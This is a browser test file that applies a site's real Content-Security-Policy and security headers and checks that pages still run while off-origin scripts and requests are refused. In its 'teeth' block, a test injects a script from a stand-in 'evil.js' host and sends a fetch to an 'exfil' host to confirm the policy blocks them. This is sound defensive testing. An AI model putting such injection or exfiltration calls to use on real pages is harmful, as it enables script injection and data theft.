/* test_csp.mjs — the security headers we SHIP, exercised by the browser that has to obey them.
 *
 * THE HOLE THIS FILE CLOSES. `sim/web/_headers` is only ever sent by Cloudflare Pages.
 * Every browser suite in this repo serves the site from a plain static server that sends
 * NO headers at all — so until now nothing could tell the difference between a policy that
 * is safe and a policy that blanks the page. That is not a theoretical worry: a CSP that
 * refuses an inline `<script>` does not degrade, it stops the page dead, and the failure
 * would first be seen by a visitor on the live domain.
 *
 * So this suite parses the REAL `_headers` (never a restated copy of the policy — a
 * hard-coded string could pass while the shipped header said something else), serves every
 * page with it, and asserts each one still WORKS: the modules ran, the inline blocks ran,
 * and nothing was refused.
 *
 * IT HAS TEETH. Block 3 injects a script tag from another origin into the loaded page and
 * requires the policy to REFUSE it. Without that, a green run would be equally consistent
 * with "the policy is correct" and "no policy arrived at all".
 *
 * WHAT IS DELIBERATELY NOT ASSERTED: `script-src` without `'unsafe-inline'`. The bundle has
 * nine inline `<script>` blocks across five pages plus ten inline `onclick=` attributes,
 * and `_headers` is a static file, so a per-response nonce is impossible and the only route
 * is a SHA-256 hash per block plus a build step and a freshness guard. `sim/web/_headers`
 * records that as the specific blocker. What IS asserted is the half that ships today: no
 * script from any other origin can load, and nothing can be sent to any other origin.
 *
 *   node sim/test_csp.mjs
 */
import { requireBrowser, serveWeb, pagesHeaders, makeChecks, finish } from "./browser_harness.mjs";

const LABEL = "CSP + security-headers test";
const { puppeteer, chrome } = await requireBrowser(LABEL);
const { fails, ok, eq, count } = makeChecks();

const site = await serveWeb({ headers: true });
const H = pagesHeaders();

/* Served under a NON-local hostname, mapped to the loopback server. That is not cosmetic:
 * `_headers` is a Cloudflare Pages artifact and Pages serves a public hostname, so this is
 * the configuration the policy actually ships into. On a LOCAL host `env.js` additionally
 * probes the optional :8081/:8082 sidecars — which this same policy refuses, correctly and
 * only under `wrangler pages dev` (headers + localhost at once). Loading from 127.0.0.1
 * would fold that dev-only quirk into every assertion below and hide real refusals behind
 * an allowance. */
const HOST = `http://moxie.hosted.test:${site.port}`;

const browser = await puppeteer.launch({
  executablePath: chrome, headless: "new",
  args: ["--no-sandbox", "--use-gl=swiftshader", "--enable-unsafe-swiftshader",
         `--host-resolver-rules=MAP moxie.hosted.test 127.0.0.1:${site.port}`],
});

/* ONE known, pre-existing refusal, named exactly rather than matched loosely.
 *
 * The repo's own `README.md` is bundled into the docs explorer and embeds an image hosted
 * on github.com (`user-attachments/…`). `img-src 'self' data: blob:` predates this pass and
 * refuses it — correctly: this project's standing rule is that everything is vendored and
 * links are assumed to die, so an off-site image in a doc is the defect, not the policy.
 * It is listed here so the guard stays STRICT for everything else and so the exemption
 * cannot be inherited silently — fixing the README removes this constant. */
const KNOWN_REFUSALS = [/user-attachments.*violates.*img-src/i];

/** What the real `static.cloudflareinsights.com` sends, and what a module fetch needs. */
const CORS = { "Access-Control-Allow-Origin": "*" };

const POLICY_LINE = /Content Security Policy|Refused to (load|connect|execute|run|apply|frame)/i;
const isKnown = (e) => KNOWN_REFUSALS.some((k) => k.test(e));

/** Console lines that are a POLICY refusal we have NOT already accounted for. */
const cspErrors = (errs) => errs.filter((e) => POLICY_LINE.test(e) && !isKnown(e));

/* Each page, and the runtime fact that proves its scripts really ran under the policy.
 * A page that loads but whose inline block was refused looks fine to the naked eye and to
 * every structural check — the probe is what separates the two. */
const PAGES = [
  ["index.html", () => !!document.getElementById("bg-canvas")],
  ["setup.html", () => !!document.getElementById("bg-canvas") && !!window.moxieQR],
  ["cloud.html", () => !!document.getElementById("bg-canvas")],
  ["docs.html", () => !!document.getElementById("tree") &&
                      document.querySelectorAll("#tree a, #tree button, #tree li").length > 0],
  // `window.moxie` is the load-bearing one: it only exists if the ES MODULE resolved
  // through sim.html's inline `<script type="importmap">` and three.js loaded from
  // ./vendor. That is the single most CSP-fragile thing on the site.
  ["sim.html", () => !!window.moxie && !!window.moxieBridge && !!window.moxieAudio &&
                     !!window.moxieMode && !!window.moxieTypedTurn && !!window.moxieStub],
];

async function load(path) {
  const page = await browser.newPage();
  await page.setViewport({ width: 1440, height: 900 });
  const errs = [], notFound = [];
  page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
  page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
  // Which URLs actually 404'd, so the console line can be correlated with a real response
  // instead of forgiven on the strength of its text (see the loop below).
  page.on("response", (r) => { if (r.status() === 404) notFound.push(r.url()); });
  const res = await page.goto(`${HOST}/${path}`, { waitUntil: "domcontentloaded", timeout: 20000 });
  await new Promise((r) => setTimeout(r, 2500));
  return { page, errs, headers: res.headers(), notFound };
}

try {
  /* =====================================================================
   * 1. The policy itself — read off the file we ship, not off a memory of it.
   * =================================================================== */
  {
    const csp = H["Content-Security-Policy"] || "";
    ok(/(^|;\s*)script-src\s+'self'/.test(csp),
       `_headers must pin script-src to 'self' (got ${JSON.stringify(csp)})`);
    ok(/(^|;\s*)connect-src\s+'self'\s*(;|$)/.test(csp),
       "connect-src stays exactly 'self' — it is what refused the port-8081 fetch");

    /* THE ONE OFF-ORIGIN SCRIPT HOST, asserted by name. Cloudflare Pages injects its Web
     * Analytics beacon into every HTML response and we cannot edit that tag, so the policy
     * has to allow the host or log a violation on every single page load. `_headers` carries
     * the full reasoning; this pins it so it cannot be "tidied" away silently. */
    ok(/(^|;\s*)script-src\s[^;]*\bhttps:\/\/static\.cloudflareinsights\.com\b/.test(csp),
       "script-src allows Cloudflare's injected analytics beacon host");
    // ...and ONLY that one. Every other scheme-ful source in script-src would be a widening
    // nobody argued for, and this is where it gets caught.
    const scriptSrc = (csp.split(";").find((d) => d.trim().startsWith("script-src")) || "").trim();
    const hosts = scriptSrc.split(/\s+/).slice(1).filter((t) => /:/.test(t) && !/^'/.test(t));
    eq(JSON.stringify(hosts), JSON.stringify(["https://static.cloudflareinsights.com"]),
       "…and script-src names EXACTLY that one off-origin host, no other");
    ok(!/cloudflareinsights/.test(csp.split(";").find((d) => d.trim().startsWith("connect-src")) || ""),
       "connect-src does NOT name it: the beacon reports to a SAME-ORIGIN /cdn-cgi/rum (see _headers)");
    for (const d of ["object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "form-action 'none'"])
      ok(csp.includes(d), `_headers must carry ${d}`);
    const hsts = H["Strict-Transport-Security"] || "";
    ok(/max-age=\d{7,}/.test(hsts), `HSTS must be set with a real max-age (got ${JSON.stringify(hsts)})`);
    eq(H["X-Content-Type-Options"], "nosniff", "nosniff is still there");
  }

  /* =====================================================================
   * 2. Every page still works with that policy actually applied.
   * =================================================================== */
  for (const [path, probe] of PAGES) {
    const { page, errs, headers, notFound } = await load(path);
    ok((headers["content-security-policy"] || "").includes("script-src"),
       `${path}: the browser really received the policy`);
    ok((headers["strict-transport-security"] || "").includes("max-age"),
       `${path}: …and HSTS`);
    eq(cspErrors(errs).length, 0,
       `${path}: NOTHING was refused by the policy — ${cspErrors(errs).slice(0, 3).join(" | ")}`);
    ok(await page.evaluate(probe),
       `${path}: its scripts actually ran under the policy (the inline blocks were not refused)`);
    /* Anything else on the console is a page fault, not a policy one, and is worth knowing.
     *
     * ONE 404 IS EXPECTED AND ONLY ONE: this harness is a static server, so `mode.js`'s
     * `GET /api/health` capability probe misses — that is the honest behaviour of a fork
     * with no Functions, and the site is built to be byte-identical when it happens. The
     * filter used to drop EVERY "status of 404" line, which meant any missing asset on any
     * shipped page slipped past the strictest console assertion this suite has. It is now
     * correlated with the 404 RESPONSES actually observed, and forgiven one for one, so a
     * genuinely missing file still fails. (`test_env_hosted.mjs` already worked this way;
     * this file did not.) */
    const expected404 = notFound.every((u) => /\/api\/health\b/.test(u));
    let budget = expected404 ? notFound.length : 0;
    const other = errs.filter((e) => {
      if (POLICY_LINE.test(e) || isKnown(e)) return false;
      if (budget > 0 && /Failed to load resource: the server responded with a status of 404/.test(e)) {
        budget--; return false;
      }
      return true;
    });
    eq(other.length, 0, `${path}: no other console errors — ${other.slice(0, 3).join(" | ")}`);
    await page.close();
  }

  /* =====================================================================
   * 3. TEETH — the policy is in force, and it refuses what it should.
   * =================================================================== */
  {
    const { page, errs } = await load("sim.html");
    const before = cspErrors(errs).length;
    eq(before, 0, "teeth: the page is clean before anything is injected");

    const loaded = await page.evaluate(() => new Promise((resolve) => {
      const s = document.createElement("script");
      s.src = "https://cdn.invalid.test/evil.js";
      s.onload = () => resolve("loaded");
      s.onerror = () => resolve("refused");
      document.head.appendChild(s);
      setTimeout(() => resolve("timeout"), 3000);
    }));
    eq(loaded, "refused",
       "teeth: a script from another origin is REFUSED — without script-src it would have run");
    await new Promise((r) => setTimeout(r, 400));
    ok(cspErrors(errs).length > before,
       "teeth: …and the browser logged the refusal, so the policy really is the one in force");

    const fetched = await page.evaluate(() =>
      fetch("https://exfil.invalid.test/x", { mode: "cors" }).then(() => "sent").catch(() => "blocked"));
    eq(fetched, "blocked", "teeth: connect-src still refuses an off-origin request");
    await page.close();
  }

  /* =====================================================================
   * 4. THE BEACON HOST — allowed by name, and by name ONLY.
   *
   * Cloudflare Pages injects `<script src="https://static.cloudflareinsights.com/…">` into
   * every HTML response. `script-src 'self'` refused it, and that refusal was on the live
   * console of every page load — a permanent error that drowns the next real one. So the
   * host is allowed. This block proves BOTH halves of that sentence, because an allowance
   * nobody checks is how a policy quietly becomes a wildcard:
   *
   *   · a script from `static.cloudflareinsights.com` RUNS, and
   *   · a script from the BARE `cloudflareinsights.com` — the beacon's own report host, one
   *     label away — is still REFUSED.
   *
   * Both are answered at the browser, so this suite still touches no network: a CSP refusal
   * happens BEFORE the request is issued, so a script that reaches the interceptor at all
   * is a script the policy permitted.
   * =================================================================== */
  {
    const page = await browser.newPage();
    await page.setViewport({ width: 1440, height: 900 });
    const errs = [];
    page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
    page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
    await page.setRequestInterception(true);
    page.on("request", (r) => {
      if (r.isInterceptResolutionHandled()) return;
      const u = r.url();
      // The real host sends CORS, and it must: Pages injects the tag with
      // `crossorigin="anonymous"` and `type="module"`, both of which make the fetch a CORS
      // fetch. A stub without the header would fail for a reason that has nothing to do
      // with the policy under test.
      if (/^https:\/\/static\.cloudflareinsights\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__beacon = 'ran';" });
      if (/^https:\/\/cloudflareinsights\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__sibling = 'ran';" });
      return r.continue();
    });
    await page.goto(`${HOST}/sim.html`, { waitUntil: "domcontentloaded", timeout: 20000 });
    await new Promise((r) => setTimeout(r, 1500));

    /** Add a script tag the way Pages injects the beacon, and report what happened. */
    const inject = (src) => page.evaluate((u) => new Promise((resolve) => {
      const s2 = document.createElement("script");
      s2.type = "module";
      s2.src = u;
      s2.onload = () => resolve("loaded");
      s2.onerror = () => resolve("refused");
      document.head.appendChild(s2);
      setTimeout(() => resolve("timeout"), 3000);
    }), src);

    eq(await inject("https://static.cloudflareinsights.com/beacon.min.js/vTESTONLY"), "loaded",
       "the injected Cloudflare beacon LOADS — the console error on every page load is gone");
    eq(await page.evaluate(() => window.__beacon || null), "ran", "…and actually executed");

    eq(await inject("https://cloudflareinsights.com/beacon.min.js/vTESTONLY"), "refused",
       "…while the BARE cloudflareinsights.com is still refused: the allowance is host-exact");
    eq(await page.evaluate(() => window.__sibling || null), null, "…and never ran");
    await new Promise((r) => setTimeout(r, 400));
    // Match the URL the browser NAMES as refused, not the line: every such line also
    // quotes the policy back, which now contains the word `static.` itself.
    ok(cspErrors(errs).some((e) => /'https:\/\/cloudflareinsights\.com\//.test(e)),
       "…with the refusal logged, so the policy really is the one in force");

    /* The connect-src half of the same question, checked rather than assumed. The beacon
     * reports through `navigator.sendBeacon` to the RELATIVE `/cdn-cgi/rum?…` (it only uses
     * the absolute `https://cloudflareinsights.com/cdn-cgi/rum` when the injected tag
     * carries no `version`, and ours carries one), so `connect-src 'self'` covers it and
     * does not have to be widened. `sendBeacon` returns false when CSP refuses it. */
    eq(await page.evaluate(() => navigator.sendBeacon("/cdn-cgi/rum?test", "x")), true,
       "the beacon's SAME-ORIGIN report path is permitted by connect-src 'self' as it stands");
    // ...and the off-origin one is still refused. Asserted with `fetch`, not `sendBeacon`:
    // Chrome queues a beacon and returns `true` before the policy check resolves, so
    // sendBeacon's return value is not a reliable witness for a REFUSAL (it is for the
    // permission above, where `true` is what a queued request means).
    eq(await page.evaluate(() =>
         fetch("https://cloudflareinsights.com/cdn-cgi/rum", { method: "POST", body: "x" })
           .then(() => "sent").catch(() => "blocked")), "blocked",
       "…and an off-origin report would still be refused — connect-src keeps its teeth");
    await page.close();
  }
} catch (e) {
  fails.push("threw: " + (e && e.stack ? e.stack.split("\n").slice(0, 4).join(" / ") : e));
} finally {
  await browser.close().catch(() => {});
  site.close();
}

finish(LABEL, { fails, count });
